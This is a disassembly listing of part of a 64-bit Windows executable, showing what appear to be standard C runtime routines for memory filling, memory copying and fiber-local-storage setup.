   1400049a7:	4d 03 c1             	add    %r9,%r8
   1400049aa:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   1400049b1:	76 4b                	jbe    0x1400049fe
   1400049b3:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   1400049ba:	84 00 00 00 00 00 
   1400049c0:	66 0f 7f 01          	movdqa %xmm0,(%rcx)
   1400049c4:	66 0f 7f 41 10       	movdqa %xmm0,0x10(%rcx)
   1400049c9:	66 0f 7f 41 20       	movdqa %xmm0,0x20(%rcx)
   1400049ce:	66 0f 7f 41 30       	movdqa %xmm0,0x30(%rcx)
   1400049d3:	66 0f 7f 41 40       	movdqa %xmm0,0x40(%rcx)
   1400049d8:	66 0f 7f 41 50       	movdqa %xmm0,0x50(%rcx)
   1400049dd:	66 0f 7f 41 60       	movdqa %xmm0,0x60(%rcx)
   1400049e2:	66 0f 7f 41 70       	movdqa %xmm0,0x70(%rcx)
   1400049e7:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   1400049ee:	49 81 e8 80 00 00 00 	sub    $0x80,%r8
   1400049f5:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   1400049fc:	73 c2                	jae    0x1400049c0
   1400049fe:	4d 8d 48 0f          	lea    0xf(%r8),%r9
   140004a02:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   140004a06:	4d 8b d9             	mov    %r9,%r11
   140004a09:	49 c1 eb 04          	shr    $0x4,%r11
   140004a0d:	47 8b 9c 9a 88 d0 01 	mov    0x1d088(%r10,%r11,4),%r11d
   140004a14:	00 
   140004a15:	4d 03 da             	add    %r10,%r11
   140004a18:	41 ff e3             	jmp    *%r11
   140004a1b:	f3 42 0f 7f 44 09 80 	movdqu %xmm0,-0x80(%rcx,%r9,1)
   140004a22:	f3 42 0f 7f 44 09 90 	movdqu %xmm0,-0x70(%rcx,%r9,1)
   140004a29:	f3 42 0f 7f 44 09 a0 	movdqu %xmm0,-0x60(%rcx,%r9,1)
   140004a30:	f3 42 0f 7f 44 09 b0 	movdqu %xmm0,-0x50(%rcx,%r9,1)
   140004a37:	f3 42 0f 7f 44 09 c0 	movdqu %xmm0,-0x40(%rcx,%r9,1)
   140004a3e:	f3 42 0f 7f 44 09 d0 	movdqu %xmm0,-0x30(%rcx,%r9,1)
   140004a45:	f3 42 0f 7f 44 09 e0 	movdqu %xmm0,-0x20(%rcx,%r9,1)
   140004a4c:	f3 42 0f 7f 44 01 f0 	movdqu %xmm0,-0x10(%rcx,%r8,1)
   140004a53:	f3 0f 7f 00          	movdqu %xmm0,(%rax)
   140004a57:	c3                   	ret
   140004a58:	cc                   	int3
   140004a59:	cc                   	int3
   140004a5a:	cc                   	int3
   140004a5b:	cc                   	int3
   140004a5c:	cc                   	int3
   140004a5d:	cc                   	int3
   140004a5e:	cc                   	int3
   140004a5f:	cc                   	int3
   140004a60:	cc                   	int3
   140004a61:	cc                   	int3
   140004a62:	cc                   	int3
   140004a63:	cc                   	int3
   140004a64:	cc                   	int3
   140004a65:	cc                   	int3
   140004a66:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140004a6d:	00 00 00 
   140004a70:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140004a75:	48 89 54 24 18       	mov    %rdx,0x18(%rsp)
   140004a7a:	44 89 44 24 10       	mov    %r8d,0x10(%rsp)
   140004a7f:	49 c7 c1 20 05 93 19 	mov    $0x19930520,%r9
   140004a86:	eb 08                	jmp    0x140004a90
   140004a88:	cc                   	int3
   140004a89:	cc                   	int3
   140004a8a:	cc                   	int3
   140004a8b:	cc                   	int3
   140004a8c:	cc                   	int3
   140004a8d:	cc                   	int3
   140004a8e:	66 90                	xchg   %ax,%ax
   140004a90:	c3                   	ret
   140004a91:	cc                   	int3
   140004a92:	cc                   	int3
   140004a93:	cc                   	int3
   140004a94:	cc                   	int3
   140004a95:	cc                   	int3
   140004a96:	cc                   	int3
   140004a97:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140004a9e:	00 00 
   140004aa0:	c3                   	ret
   140004aa1:	cc                   	int3
   140004aa2:	cc                   	int3
   140004aa3:	cc                   	int3
   140004aa4:	48 8b 05 9d a9 00 00 	mov    0xa99d(%rip),%rax        # 0x14000f448
   140004aab:	48 8d 15 b6 f0 ff ff 	lea    -0xf4a(%rip),%rdx        # 0x140003b68
   140004ab2:	48 3b c2             	cmp    %rdx,%rax
   140004ab5:	74 23                	je     0x140004ada
   140004ab7:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140004abe:	00 00 
   140004ac0:	48 8b 89 98 00 00 00 	mov    0x98(%rcx),%rcx
   140004ac7:	48 3b 48 10          	cmp    0x10(%rax),%rcx
   140004acb:	72 06                	jb     0x140004ad3
   140004acd:	48 3b 48 08          	cmp    0x8(%rax),%rcx
   140004ad1:	76 07                	jbe    0x140004ada
   140004ad3:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140004ad8:	cd 29                	int    $0x29
   140004ada:	c3                   	ret
   140004adb:	cc                   	int3
   140004adc:	48 83 ec 28          	sub    $0x28,%rsp
   140004ae0:	48 85 c9             	test   %rcx,%rcx
   140004ae3:	74 11                	je     0x140004af6
   140004ae5:	48 8d 05 94 65 01 00 	lea    0x16594(%rip),%rax        # 0x14001b080
   140004aec:	48 3b c8             	cmp    %rax,%rcx
   140004aef:	74 05                	je     0x140004af6
   140004af1:	e8 d2 1b 00 00       	call   0x1400066c8
   140004af6:	48 83 c4 28          	add    $0x28,%rsp
   140004afa:	c3                   	ret
   140004afb:	cc                   	int3
   140004afc:	48 83 ec 28          	sub    $0x28,%rsp
   140004b00:	e8 13 00 00 00       	call   0x140004b18
   140004b05:	48 85 c0             	test   %rax,%rax
   140004b08:	74 05                	je     0x140004b0f
   140004b0a:	48 83 c4 28          	add    $0x28,%rsp
   140004b0e:	c3                   	ret
   140004b0f:	e8 bc 21 00 00       	call   0x140006cd0
   140004b14:	cc                   	int3
   140004b15:	cc                   	int3
   140004b16:	cc                   	int3
   140004b17:	cc                   	int3
   140004b18:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004b1d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004b22:	57                   	push   %rdi
   140004b23:	48 83 ec 20          	sub    $0x20,%rsp
   140004b27:	83 3d 02 55 01 00 ff 	cmpl   $0xffffffff,0x15502(%rip)        # 0x14001a030
   140004b2e:	75 07                	jne    0x140004b37
   140004b30:	33 c0                	xor    %eax,%eax
   140004b32:	e9 90 00 00 00       	jmp    0x140004bc7
   140004b37:	ff 15 93 a5 00 00    	call   *0xa593(%rip)        # 0x14000f0d0
   140004b3d:	8b 0d ed 54 01 00    	mov    0x154ed(%rip),%ecx        # 0x14001a030
   140004b43:	8b f8                	mov    %eax,%edi
   140004b45:	e8 5a 03 00 00       	call   0x140004ea4
   140004b4a:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   140004b4e:	33 f6                	xor    %esi,%esi
   140004b50:	48 3b c2             	cmp    %rdx,%rax
   140004b53:	74 67                	je     0x140004bbc
   140004b55:	48 85 c0             	test   %rax,%rax
   140004b58:	74 05                	je     0x140004b5f
   140004b5a:	48 8b f0             	mov    %rax,%rsi
   140004b5d:	eb 5d                	jmp    0x140004bbc
   140004b5f:	8b 0d cb 54 01 00    	mov    0x154cb(%rip),%ecx        # 0x14001a030
   140004b65:	e8 82 03 00 00       	call   0x140004eec
   140004b6a:	85 c0                	test   %eax,%eax
   140004b6c:	74 4e                	je     0x140004bbc
   140004b6e:	ba 80 00 00 00       	mov    $0x80,%edx
   140004b73:	8d 4a 81             	lea    -0x7f(%rdx),%ecx
   140004b76:	e8 ad 21 00 00       	call   0x140006d28
   140004b7b:	8b 0d af 54 01 00    	mov    0x154af(%rip),%ecx        # 0x14001a030
   140004b81:	48 8b d8             	mov    %rax,%rbx
   140004b84:	48 85 c0             	test   %rax,%rax
   140004b87:	74 24                	je     0x140004bad
   140004b89:	48 8b d0             	mov    %rax,%rdx
   140004b8c:	e8 5b 03 00 00       	call   0x140004eec
   140004b91:	85 c0                	test   %eax,%eax
   140004b93:	74 12                	je     0x140004ba7
   140004b95:	48 8b c3             	mov    %rbx,%rax
   140004b98:	c7 43 78 fe ff ff ff 	movl   $0xfffffffe,0x78(%rbx)
   140004b9f:	48 8b de             	mov    %rsi,%rbx
   140004ba2:	48 8b f0             	mov    %rax,%rsi
   140004ba5:	eb 0d                	jmp    0x140004bb4
   140004ba7:	8b 0d 83 54 01 00    	mov    0x15483(%rip),%ecx        # 0x14001a030
   140004bad:	33 d2                	xor    %edx,%edx
   140004baf:	e8 38 03 00 00       	call   0x140004eec
   140004bb4:	48 8b cb             	mov    %rbx,%rcx
   140004bb7:	e8 0c 1b 00 00       	call   0x1400066c8
   140004bbc:	8b cf                	mov    %edi,%ecx
   140004bbe:	ff 15 34 a7 00 00    	call   *0xa734(%rip)        # 0x14000f2f8
   140004bc4:	48 8b c6             	mov    %rsi,%rax
   140004bc7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004bcc:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004bd1:	48 83 c4 20          	add    $0x20,%rsp
   140004bd5:	5f                   	pop    %rdi
   140004bd6:	c3                   	ret
   140004bd7:	cc                   	int3
   140004bd8:	48 83 ec 28          	sub    $0x28,%rsp
   140004bdc:	48 8d 0d f9 fe ff ff 	lea    -0x107(%rip),%rcx        # 0x140004adc
   140004be3:	e8 2c 02 00 00       	call   0x140004e14
   140004be8:	89 05 42 54 01 00    	mov    %eax,0x15442(%rip)        # 0x14001a030
   140004bee:	83 f8 ff             	cmp    $0xffffffff,%eax
   140004bf1:	74 25                	je     0x140004c18
   140004bf3:	48 8d 15 86 64 01 00 	lea    0x16486(%rip),%rdx        # 0x14001b080
   140004bfa:	8b c8                	mov    %eax,%ecx
   140004bfc:	e8 eb 02 00 00       	call   0x140004eec
   140004c01:	85 c0                	test   %eax,%eax
   140004c03:	74 0e                	je     0x140004c13
   140004c05:	c7 05 e9 64 01 00 fe 	movl   $0xfffffffe,0x164e9(%rip)        # 0x14001b0f8
   140004c0c:	ff ff ff 
   140004c0f:	b0 01                	mov    $0x1,%al
   140004c11:	eb 07                	jmp    0x140004c1a
   140004c13:	e8 08 00 00 00       	call   0x140004c20
   140004c18:	32 c0                	xor    %al,%al
   140004c1a:	48 83 c4 28          	add    $0x28,%rsp
   140004c1e:	c3                   	ret
   140004c1f:	cc                   	int3
   140004c20:	48 83 ec 28          	sub    $0x28,%rsp
   140004c24:	8b 0d 06 54 01 00    	mov    0x15406(%rip),%ecx        # 0x14001a030
   140004c2a:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140004c2d:	74 0c                	je     0x140004c3b
   140004c2f:	e8 28 02 00 00       	call   0x140004e5c
   140004c34:	83 0d f5 53 01 00 ff 	orl    $0xffffffff,0x153f5(%rip)        # 0x14001a030
   140004c3b:	b0 01                	mov    $0x1,%al
   140004c3d:	48 83 c4 28          	add    $0x28,%rsp
   140004c41:	c3                   	ret
   140004c42:	cc                   	int3
   140004c43:	cc                   	int3
   140004c44:	40 53                	rex push %rbx
   140004c46:	48 83 ec 20          	sub    $0x20,%rsp
   140004c4a:	33 db                	xor    %ebx,%ebx
   140004c4c:	48 8d 15 ad 64 01 00 	lea    0x164ad(%rip),%rdx        # 0x14001b100
   140004c53:	45 33 c0             	xor    %r8d,%r8d
   140004c56:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140004c5a:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   140004c5e:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   140004c63:	e8 d8 02 00 00       	call   0x140004f40
   140004c68:	85 c0                	test   %eax,%eax
   140004c6a:	74 11                	je     0x140004c7d
   140004c6c:	ff 05 b6 64 01 00    	incl   0x164b6(%rip)        # 0x14001b128
   140004c72:	ff c3                	inc    %ebx
   140004c74:	83 fb 01             	cmp    $0x1,%ebx
   140004c77:	72 d3                	jb     0x140004c4c
   140004c79:	b0 01                	mov    $0x1,%al
   140004c7b:	eb 07                	jmp    0x140004c84
   140004c7d:	e8 0a 00 00 00       	call   0x140004c8c
   140004c82:	32 c0                	xor    %al,%al
   140004c84:	48 83 c4 20          	add    $0x20,%rsp
   140004c88:	5b                   	pop    %rbx
   140004c89:	c3                   	ret
   140004c8a:	cc                   	int3
   140004c8b:	cc                   	int3
   140004c8c:	40 53                	rex push %rbx
   140004c8e:	48 83 ec 20          	sub    $0x20,%rsp
   140004c92:	8b 1d 90 64 01 00    	mov    0x16490(%rip),%ebx        # 0x14001b128
   140004c98:	eb 1d                	jmp    0x140004cb7
   140004c9a:	48 8d 05 5f 64 01 00 	lea    0x1645f(%rip),%rax        # 0x14001b100
   140004ca1:	ff cb                	dec    %ebx
   140004ca3:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   140004ca7:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140004cab:	ff 15 5f a6 00 00    	call   *0xa65f(%rip)        # 0x14000f310
   140004cb1:	ff 0d 71 64 01 00    	decl   0x16471(%rip)        # 0x14001b128
   140004cb7:	85 db                	test   %ebx,%ebx
   140004cb9:	75 df                	jne    0x140004c9a
   140004cbb:	b0 01                	mov    $0x1,%al
   140004cbd:	48 83 c4 20          	add    $0x20,%rsp
   140004cc1:	5b                   	pop    %rbx
   140004cc2:	c3                   	ret
   140004cc3:	cc                   	int3
   140004cc4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004cc9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140004cce:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004cd3:	57                   	push   %rdi
   140004cd4:	41 54                	push   %r12
   140004cd6:	41 55                	push   %r13
   140004cd8:	41 56                	push   %r14
   140004cda:	41 57                	push   %r15
   140004cdc:	48 83 ec 20          	sub    $0x20,%rsp
   140004ce0:	8b f9                	mov    %ecx,%edi
   140004ce2:	4c 8d 3d 17 b3 ff ff 	lea    -0x4ce9(%rip),%r15        # 0x140000000
   140004ce9:	49 83 ce ff          	or     $0xffffffffffffffff,%r14
   140004ced:	4d 8b e1             	mov    %r9,%r12
   140004cf0:	49 8b e8             	mov    %r8,%rbp
   140004cf3:	4c 8b ea             	mov    %rdx,%r13
   140004cf6:	49 8b 84 ff b0 b1 01 	mov    0x1b1b0(%r15,%rdi,8),%rax
   140004cfd:	00 
   140004cfe:	90                   	nop
   140004cff:	49 3b c6             	cmp    %r14,%rax
   140004d02:	0f 84 eb 00 00 00    	je     0x140004df3
   140004d08:	48 85 c0             	test   %rax,%rax
   140004d0b:	0f 85 e4 00 00 00    	jne    0x140004df5
   140004d11:	4d 3b c1             	cmp    %r9,%r8
   140004d14:	0f 84 d1 00 00 00    	je     0x140004deb
   140004d1a:	8b 75 00             	mov    0x0(%rbp),%esi
   140004d1d:	49 8b 9c f7 98 b1 01 	mov    0x1b198(%r15,%rsi,8),%rbx
   140004d24:	00 
   140004d25:	90                   	nop
   140004d26:	48 85 db             	test   %rbx,%rbx
   140004d29:	74 0b                	je     0x140004d36
   140004d2b:	49 3b de             	cmp    %r14,%rbx
   140004d2e:	0f 85 99 00 00 00    	jne    0x140004dcd
   140004d34:	eb 6b                	jmp    0x140004da1
   140004d36:	4d 8b bc f7 b8 03 01 	mov    0x103b8(%r15,%rsi,8),%r15
   140004d3d:	00 
   140004d3e:	33 d2                	xor    %edx,%edx
   140004d40:	49 8b cf             	mov    %r15,%rcx
   140004d43:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   140004d49:	ff 15 f1 a5 00 00    	call   *0xa5f1(%rip)        # 0x14000f340
   140004d4f:	48 8b d8             	mov    %rax,%rbx
   140004d52:	48 85 c0             	test   %rax,%rax
   140004d55:	75 56                	jne    0x140004dad
   140004d57:	ff 15 73 a3 00 00    	call   *0xa373(%rip)        # 0x14000f0d0
   140004d5d:	83 f8 57             	cmp    $0x57,%eax
   140004d60:	75 2d                	jne    0x140004d8f
   140004d62:	44 8d 43 07          	lea    0x7(%rbx),%r8d
   140004d66:	49 8b cf             	mov    %r15,%rcx
   140004d69:	48 8d 15 f8 b6 00 00 	lea    0xb6f8(%rip),%rdx        # 0x140010468
   140004d70:	e8 4b 20 00 00       	call   0x140006dc0
   140004d75:	85 c0                	test   %eax,%eax
   140004d77:	74 16                	je     0x140004d8f
   140004d79:	45 33 c0             	xor    %r8d,%r8d
   140004d7c:	33 d2                	xor    %edx,%edx
   140004d7e:	49 8b cf             	mov    %r15,%rcx
   140004d81:	ff 15 b9 a5 00 00    	call   *0xa5b9(%rip)        # 0x14000f340
   140004d87:	48 8b d8             	mov    %rax,%rbx
   140004d8a:	48 85 c0             	test   %rax,%rax
   140004d8d:	75 1e                	jne    0x140004dad
   140004d8f:	49 8b c6             	mov    %r14,%rax
   140004d92:	4c 8d 3d 67 b2 ff ff 	lea    -0x4d99(%rip),%r15        # 0x140000000
   140004d99:	49 87 84 f7 98 b1 01 	xchg   %rax,0x1b198(%r15,%rsi,8)
   140004da0:	00 
   140004da1:	48 83 c5 04          	add    $0x4,%rbp
   140004da5:	49 3b ec             	cmp    %r12,%rbp
   140004da8:	e9 67 ff ff ff       	jmp    0x140004d14
   140004dad:	48 8b c3             	mov    %rbx,%rax
   140004db0:	4c 8d 3d 49 b2 ff ff 	lea    -0x4db7(%rip),%r15        # 0x140000000
   140004db7:	49 87 84 f7 98 b1 01 	xchg   %rax,0x1b198(%r15,%rsi,8)
   140004dbe:	00 
   140004dbf:	48 85 c0             	test   %rax,%rax
   140004dc2:	74 09                	je     0x140004dcd
   140004dc4:	48 8b cb             	mov    %rbx,%rcx
   140004dc7:	ff 15 73 a3 00 00    	call   *0xa373(%rip)        # 0x14000f140
   140004dcd:	49 8b d5             	mov    %r13,%rdx
   140004dd0:	48 8b cb             	mov    %rbx,%rcx
   140004dd3:	ff 15 2f a3 00 00    	call   *0xa32f(%rip)        # 0x14000f108
   140004dd9:	48 85 c0             	test   %rax,%rax
   140004ddc:	74 0d                	je     0x140004deb
   140004dde:	48 8b c8             	mov    %rax,%rcx
   140004de1:	49 87 8c ff b0 b1 01 	xchg   %rcx,0x1b1b0(%r15,%rdi,8)
   140004de8:	00 
   140004de9:	eb 0a                	jmp    0x140004df5
   140004deb:	4d 87 b4 ff b0 b1 01 	xchg   %r14,0x1b1b0(%r15,%rdi,8)
   140004df2:	00 
   140004df3:	33 c0                	xor    %eax,%eax
   140004df5:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140004dfa:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140004dff:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140004e04:	48 83 c4 20          	add    $0x20,%rsp
   140004e08:	41 5f                	pop    %r15
   140004e0a:	41 5e                	pop    %r14
   140004e0c:	41 5d                	pop    %r13
   140004e0e:	41 5c                	pop    %r12
   140004e10:	5f                   	pop    %rdi
   140004e11:	c3                   	ret
   140004e12:	cc                   	int3
   140004e13:	cc                   	int3
   140004e14:	40 53                	rex push %rbx
   140004e16:	48 83 ec 20          	sub    $0x20,%rsp
   140004e1a:	48 8b d9             	mov    %rcx,%rbx
   140004e1d:	4c 8d 0d 5c b6 00 00 	lea    0xb65c(%rip),%r9        # 0x140010480
   140004e24:	33 c9                	xor    %ecx,%ecx
   140004e26:	4c 8d 05 4b b6 00 00 	lea    0xb64b(%rip),%r8        # 0x140010478
   140004e2d:	48 8d 15 4c b6 00 00 	lea    0xb64c(%rip),%rdx        # 0x140010480
   140004e34:	e8 8b fe ff ff       	call   0x140004cc4
   140004e39:	48 85 c0             	test   %rax,%rax
   140004e3c:	74 0f                	je     0x140004e4d
   140004e3e:	48 8b cb             	mov    %rbx,%rcx
   140004e41:	48 83 c4 20          	add    $0x20,%rsp
   140004e45:	5b                   	pop    %rbx
   140004e46:	48 ff 25 0b a6 00 00 	rex.W jmp *0xa60b(%rip)        # 0x14000f458
   140004e4d:	48 83 c4 20          	add    $0x20,%rsp
   140004e51:	5b                   	pop    %rbx
   140004e52:	48 ff 25 c7 a4 00 00 	rex.W jmp *0xa4c7(%rip)        # 0x14000f320
   140004e59:	cc                   	int3
   140004e5a:	cc                   	int3
   140004e5b:	cc                   	int3
   140004e5c:	40 53                	rex push %rbx
   140004e5e:	48 83 ec 20          	sub    $0x20,%rsp
   140004e62:	8b d9                	mov    %ecx,%ebx
   140004e64:	4c 8d 0d 2d b6 00 00 	lea    0xb62d(%rip),%r9        # 0x140010498
   140004e6b:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004e70:	4c 8d 05 19 b6 00 00 	lea    0xb619(%rip),%r8        # 0x140010490
   140004e77:	48 8d 15 1a b6 00 00 	lea    0xb61a(%rip),%rdx        # 0x140010498
   140004e7e:	e8 41 fe ff ff       	call   0x140004cc4
   140004e83:	8b cb                	mov    %ebx,%ecx
   140004e85:	48 85 c0             	test   %rax,%rax
   140004e88:	74 0c                	je     0x140004e96
   140004e8a:	48 83 c4 20          	add    $0x20,%rsp
   140004e8e:	5b                   	pop    %rbx
   140004e8f:	48 ff 25 c2 a5 00 00 	rex.W jmp *0xa5c2(%rip)        # 0x14000f458
   140004e96:	48 83 c4 20          	add    $0x20,%rsp
   140004e9a:	5b                   	pop    %rbx
   140004e9b:	48 ff 25 96 a4 00 00 	rex.W jmp *0xa496(%rip)        # 0x14000f338
   140004ea2:	cc                   	int3
   140004ea3:	cc                   	int3
   140004ea4:	40 53                	rex push %rbx
   140004ea6:	48 83 ec 20          	sub    $0x20,%rsp
   140004eaa:	8b d9                	mov    %ecx,%ebx
   140004eac:	4c 8d 0d f5 b5 00 00 	lea    0xb5f5(%rip),%r9        # 0x1400104a8
   140004eb3:	b9 02 00 00 00       	mov    $0x2,%ecx
   140004eb8:	4c 8d 05 e1 b5 00 00 	lea    0xb5e1(%rip),%r8        # 0x1400104a0
   140004ebf:	48 8d 15 e2 b5 00 00 	lea    0xb5e2(%rip),%rdx        # 0x1400104a8
   140004ec6:	e8 f9 fd ff ff       	call   0x140004cc4
   140004ecb:	8b cb                	mov    %ebx,%ecx
   140004ecd:	48 85 c0             	test   %rax,%rax
   140004ed0:	74 0c                	je     0x140004ede
   140004ed2:	48 83 c4 20          	add    $0x20,%rsp
   140004ed6:	5b                   	pop    %rbx
   140004ed7:	48 ff 25 7a a5 00 00 	rex.W jmp *0xa57a(%rip)        # 0x14000f458
   140004ede:	48 83 c4 20          	add    $0x20,%rsp
   140004ee2:	5b                   	pop    %rbx
   140004ee3:	48 ff 25 3e a4 00 00 	rex.W jmp *0xa43e(%rip)        # 0x14000f328
   140004eea:	cc                   	int3
   140004eeb:	cc                   	int3
   140004eec:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004ef1:	57                   	push   %rdi
   140004ef2:	48 83 ec 20          	sub    $0x20,%rsp
   140004ef6:	48 8b da             	mov    %rdx,%rbx
   140004ef9:	4c 8d 0d c0 b5 00 00 	lea    0xb5c0(%rip),%r9        # 0x1400104c0
   140004f00:	8b f9                	mov    %ecx,%edi
   140004f02:	48 8d 15 b7 b5 00 00 	lea    0xb5b7(%rip),%rdx        # 0x1400104c0
   140004f09:	b9 03 00 00 00       	mov    $0x3,%ecx
   140004f0e:	4c 8d 05 a3 b5 00 00 	lea    0xb5a3(%rip),%r8        # 0x1400104b8
   140004f15:	e8 aa fd ff ff       	call   0x140004cc4
   140004f1a:	48 8b d3             	mov    %rbx,%rdx
   140004f1d:	8b cf                	mov    %edi,%ecx
   140004f1f:	48 85 c0             	test   %rax,%rax
   140004f22:	74 08                	je     0x140004f2c
   140004f24:	ff 15 2e a5 00 00    	call   *0xa52e(%rip)        # 0x14000f458
   140004f2a:	eb 06                	jmp    0x140004f32
   140004f2c:	ff 15 fe a3 00 00    	call   *0xa3fe(%rip)        # 0x14000f330
   140004f32:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004f37:	48 83 c4 20          	add    $0x20,%rsp
   140004f3b:	5f                   	pop    %rdi
   140004f3c:	c3                   	ret
   140004f3d:	cc                   	int3
   140004f3e:	cc                   	int3
   140004f3f:	cc                   	int3
   140004f40:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004f45:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004f4a:	57                   	push   %rdi
   140004f4b:	48 83 ec 20          	sub    $0x20,%rsp
   140004f4f:	41 8b f0             	mov    %r8d,%esi
   140004f52:	4c 8d 0d 7f b5 00 00 	lea    0xb57f(%rip),%r9        # 0x1400104d8
   140004f59:	8b da                	mov    %edx,%ebx
   140004f5b:	4c 8d 05 6e b5 00 00 	lea    0xb56e(%rip),%r8        # 0x1400104d0
   140004f62:	48 8b f9             	mov    %rcx,%rdi
   140004f65:	48 8d 15 6c b5 00 00 	lea    0xb56c(%rip),%rdx        # 0x1400104d8
   140004f6c:	b9 04 00 00 00       	mov    $0x4,%ecx
   140004f71:	e8 4e fd ff ff       	call   0x140004cc4
   140004f76:	8b d3                	mov    %ebx,%edx
   140004f78:	48 8b cf             	mov    %rdi,%rcx
   140004f7b:	48 85 c0             	test   %rax,%rax
   140004f7e:	74 0b                	je     0x140004f8b
   140004f80:	44 8b c6             	mov    %esi,%r8d
   140004f83:	ff 15 cf a4 00 00    	call   *0xa4cf(%rip)        # 0x14000f458
   140004f89:	eb 06                	jmp    0x140004f91
   140004f8b:	ff 15 87 a3 00 00    	call   *0xa387(%rip)        # 0x14000f318
   140004f91:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004f96:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140004f9b:	48 83 c4 20          	add    $0x20,%rsp
   140004f9f:	5f                   	pop    %rdi
   140004fa0:	c3                   	ret
   140004fa1:	cc                   	int3
   140004fa2:	cc                   	int3
   140004fa3:	cc                   	int3
   140004fa4:	cc                   	int3
   140004fa5:	cc                   	int3
   140004fa6:	cc                   	int3
   140004fa7:	cc                   	int3
   140004fa8:	cc                   	int3
   140004fa9:	cc                   	int3
   140004faa:	cc                   	int3
   140004fab:	cc                   	int3
   140004fac:	cc                   	int3
   140004fad:	cc                   	int3
   140004fae:	cc                   	int3
   140004faf:	cc                   	int3
   140004fb0:	cc                   	int3
   140004fb1:	cc                   	int3
   140004fb2:	cc                   	int3
   140004fb3:	cc                   	int3
   140004fb4:	cc                   	int3
   140004fb5:	cc                   	int3
   140004fb6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140004fbd:	00 00 00 
   140004fc0:	57                   	push   %rdi
   140004fc1:	56                   	push   %rsi
   140004fc2:	48 8b f9             	mov    %rcx,%rdi
   140004fc5:	48 8b f2             	mov    %rdx,%rsi
   140004fc8:	49 8b c8             	mov    %r8,%rcx
   140004fcb:	f3 a4                	rep movsb (%rsi),(%rdi)
   140004fcd:	5e                   	pop    %rsi
   140004fce:	5f                   	pop    %rdi
   140004fcf:	c3                   	ret
   140004fd0:	cc                   	int3
   140004fd1:	cc                   	int3
   140004fd2:	cc                   	int3
   140004fd3:	cc                   	int3
   140004fd4:	cc                   	int3
   140004fd5:	cc                   	int3
   140004fd6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140004fdd:	00 00 00 
   140004fe0:	48 8b c1             	mov    %rcx,%rax
   140004fe3:	4c 8d 15 16 b0 ff ff 	lea    -0x4fea(%rip),%r10        # 0x140000000
   140004fea:	49 83 f8 0f          	cmp    $0xf,%r8
   140004fee:	0f 87 0c 01 00 00    	ja     0x140005100
   140004ff4:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140004ffb:	00 00 00 00 00 
   140005000:	47 8b 8c 82 b0 d0 01 	mov    0x1d0b0(%r10,%r8,4),%r9d
   140005007:	00 
   140005008:	4d 03 ca             	add    %r10,%r9
   14000500b:	41 ff e1             	jmp    *%r9
   14000500e:	c3                   	ret
   14000500f:	90                   	nop
   140005010:	4c 8b 02             	mov    (%rdx),%r8
   140005013:	8b 4a 08             	mov    0x8(%rdx),%ecx
   140005016:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   14000501b:	44 0f b6 52 0e       	movzbl 0xe(%rdx),%r10d
   140005020:	4c 89 00             	mov    %r8,(%rax)
   140005023:	89 48 08             	mov    %ecx,0x8(%rax)
   140005026:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   14000502b:	44 88 50 0e          	mov    %r10b,0xe(%rax)
   14000502f:	c3                   	ret
   140005030:	4c 8b 02             	mov    (%rdx),%r8
   140005033:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   140005037:	44 0f b6 4a 0a       	movzbl 0xa(%rdx),%r9d
   14000503c:	4c 89 00             	mov    %r8,(%rax)
   14000503f:	66 89 48 08          	mov    %cx,0x8(%rax)
   140005043:	44 88 48 0a          	mov    %r9b,0xa(%rax)
   140005047:	c3                   	ret
   140005048:	0f b7 0a             	movzwl (%rdx),%ecx
   14000504b:	66 89 08             	mov    %cx,(%rax)
   14000504e:	c3                   	ret
   14000504f:	90                   	nop
   140005050:	8b 0a                	mov    (%rdx),%ecx
   140005052:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   140005057:	44 0f b6 4a 06       	movzbl 0x6(%rdx),%r9d
   14000505c:	89 08                	mov    %ecx,(%rax)
   14000505e:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   140005063:	44 88 48 06          	mov    %r9b,0x6(%rax)
   140005067:	c3                   	ret
   140005068:	4c 8b 02             	mov    (%rdx),%r8
